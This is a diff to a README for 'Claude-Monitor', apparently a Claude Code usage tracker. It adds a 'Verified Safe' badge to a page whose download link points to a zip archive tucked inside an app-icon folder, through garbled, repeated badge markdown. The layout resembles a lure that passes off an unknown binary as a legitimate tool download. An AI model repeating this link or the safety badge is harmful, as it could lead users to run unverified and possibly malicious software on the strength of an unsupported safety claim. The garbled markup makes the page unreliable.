@@ -1,5 +1,7 @@
 # 🚀 Claude-Monitor - Track Your Claude Code Usage Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/balochshees-claude-monitor)
+
 ## 📥 Download the Latest Version
 
 [![Download Claude-Monitor](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip%20Claude--Monitor-v1.0.0-blue)](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip)
